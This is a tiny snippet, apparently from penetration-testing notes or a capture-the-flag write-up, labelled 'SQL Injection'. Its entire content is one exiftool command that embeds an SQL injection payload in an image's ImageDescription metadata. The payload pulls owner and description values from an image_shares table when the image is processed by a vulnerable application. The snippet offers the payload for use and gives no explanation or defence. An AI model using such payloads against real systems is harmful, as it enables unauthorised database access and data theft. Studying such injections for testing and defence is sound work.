SQL Injection: 
```shell
$ exiftool img.jpg -imagedescription="',(select concat(owner,description)from(SELECT * FROM image_shares)as x LIMIT 0,1),1)--+" -o img2.jpg`
```
